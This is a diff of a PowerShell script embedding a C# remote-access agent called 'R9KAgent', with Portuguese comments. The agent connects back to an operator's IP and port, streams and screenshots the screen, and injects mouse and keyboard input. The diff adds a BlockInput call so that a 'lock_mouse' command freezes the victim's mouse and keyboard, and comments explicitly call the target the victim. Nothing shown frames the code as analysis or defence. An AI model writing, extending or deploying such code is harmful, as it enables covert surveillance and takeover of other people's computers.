@@ -41,9 +41,7 @@ if (-not ("R9KAgent" -as [type])) {
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-        [DllImport("user32.dll")] public static extern bool ClipCursor(IntPtr lpRect);
-        [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
-        [DllImport("user32.dll")] public static extern bool ClipCursor(ref RECT lpRect);
+        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt); // Trava mouse e teclado da vítima
 
         static string IP;
         static int PORT;
@@ -54,7 +52,6 @@ if (-not ("R9KAgent" -as [type])) {
         static bool streaming = false;
         static object writeLock = new object();
 
-        // Fila inteligente de mouse (evita lag e mouse fantasma)
         static int targetX = -1, targetY = -1;
         static bool hasNewPos = false;
 
@@ -74,7 +71,7 @@ if (-not ("R9KAgent" -as [type])) {
 
                     Thread tRead = new Thread(ReadLoop); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
-                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start(); // Thread dedicada ao mouse
+                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
                     while (client.Connected) Thread.Sleep(1000);
                 } catch { Thread.Sleep(3000); }
@@ -106,7 +103,7 @@ if (-not ("R9KAgent" -as [type])) {
                     } catch {}
                     hasNewPos = false;
                 }
-                Thread.Sleep(10); // Executa a 100Hz (super rápido)
+                Thread.Sleep(10); 
             }
         }
 
@@ -114,9 +111,9 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 try {
                     if (streaming && client.Connected) {
-                        string b64 = CaptureScreen(1280, 40); // Aumentado para 1280 e qualidade 40
+                        string b64 = CaptureScreen(1280, 40);
                         if (b64 != null) Send("SCREEN:" + b64);
-                        Thread.Sleep(30); // 33 FPS de tela
+                        Thread.Sleep(30); 
                     } else { Thread.Sleep(50); }
                 } catch { Thread.Sleep(1000); }
             }
@@ -126,14 +123,19 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
-                if (cmd == "exit") { Environment.Exit(0); }
+                if (cmd == "exit") { BlockInput(false); Environment.Exit(0); }
                 
+                // TRAVA O MOUSE E O TECLADO DA VÍTIMA
                 if (cmd == "lock_mouse") {
-                    RECT rect = new RECT(); rect.Left = 0; rect.Top = 0;
-                    rect.Right = Screen.PrimaryScreen.Bounds.Width; rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
-                    ClipCursor(ref rect); Send("MOUSE_LOCKED"); return;
+                    BlockInput(true); 
+                    Send("MOUSE_LOCKED"); return;
                 }
-                if (cmd == "unlock_mouse") { ClipCursor(IntPtr.Zero); Send("MOUSE_UNLOCKED"); return; }
+                // SOLTA O MOUSE E O TECLADO
+                if (cmd == "unlock_mouse") { 
+                    BlockInput(false); 
+                    Send("MOUSE_UNLOCKED"); return; 
+                }
+
                 if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
                 if (cmd == "ping") { Send("PONG"); return; }
 
@@ -141,7 +143,7 @@ if (-not ("R9KAgent" -as [type])) {
                     string[] p = cmd.Split(' ');
                     targetX = int.Parse(p[1]);
                     targetY = int.Parse(p[2]);
-                    hasNewPos = true; // Avisa a Thread de Input que há nova posição
+                    hasNewPos = true;
                 }
                 else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                 else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
